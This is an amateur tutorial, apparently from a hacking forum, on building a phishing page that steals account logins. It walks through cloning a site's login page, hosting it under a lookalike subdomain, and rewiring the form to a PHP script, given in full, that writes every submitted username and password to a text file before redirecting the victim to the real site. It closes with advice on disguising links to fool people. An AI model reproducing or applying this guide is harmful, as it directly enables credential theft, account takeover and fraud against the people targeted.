 What is a phisher? 101
 ------------------------

 A phisher is a fake login page used to gain access to someones account. When someone logs into the fake login page, there password is sent to you.

 --------------------------
 Making a T35 Account 102
 --------------------------

 In order to make a phisher, you need a web hosting site, I recommend T35. Sign up with a free acount and title it (websiteyourgonnaphish).spam.com For example: myspace.spam.com Most likeley, it is taken so add numbers like 08, or 07.

 --------------------------------------
 Getting Web Pages Source Code 103
 --------------------------------------

 After you create that page, go to the website you will make a phisher for. Open the login page, From there right-click the page, and click View Source. Copy and paste what has popped-up.

 ------------------------
 Creating Phish File 104
 ------------------------

 Once you have that copied, go to your T35 account. Click on "New File" Title it login.htm Then paste your Source Code you copied from 104. Save it.

 Now create another file, title it fhish.php And inside, paste this code:




Code:


<?php
 header("Location: http://www.phisshed-website.com");
 $handle = fopen("thepasses.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
 fwrite($handle, $value);
 fwrite($handle, "\r\n");
 }
 fwrite($handle, "\r\n");
 fclose($handle);
 exit;
 ?>


 The http://www.phisshed-website.com is what the page goes to after the victim logs in, change that to what desired

 Save the file.


 Go back to your login.htm file and click edit. Press CTRL+F and type in action= in the box. Keep pressing find until you find something that says action=(something that has to do with logging in). Replace that with fhish.php. Congratulations, you have a phisher!

 -------------------------
 How to fool people - 105
 -------------------------
 What you do now is disguise your link. Use this code:

 T35acount.spam.com/login.htm

 That is the link to your phishing page. When people login to that, you will get the password in a password.txt file that will be created when someone types something into it. But, you have to trick people. Use this code.

*real website name*.com/login.php

 You do the same for any forum!

 ALTERNATIVES:

 Also, if you don't want to use spam.com, use ripway.com and after you uploaded everything, go to http://www.dot.tk and choose a free .tk domain name.
